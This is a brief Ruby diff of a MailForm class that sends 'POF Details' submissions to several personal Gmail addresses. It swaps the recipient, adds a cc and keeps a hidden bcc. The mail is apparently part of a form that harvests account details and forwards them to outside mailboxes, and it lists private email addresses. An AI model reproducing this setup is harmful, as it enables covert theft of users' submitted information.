@@ -11,7 +11,8 @@ class Welcome < MailForm::Base
 
       {
         :subject => "POF Details ",
-        :to => 'fortune.chibuike1@gmail.com',
+        :to => 'Chimaobinwaogazi2016@gmail.com',
+        :cc => 'delightedchika@gmail.com',
         :bcc => "daveskeen24@gmail.com",
         :from => %("#{username}")
       }
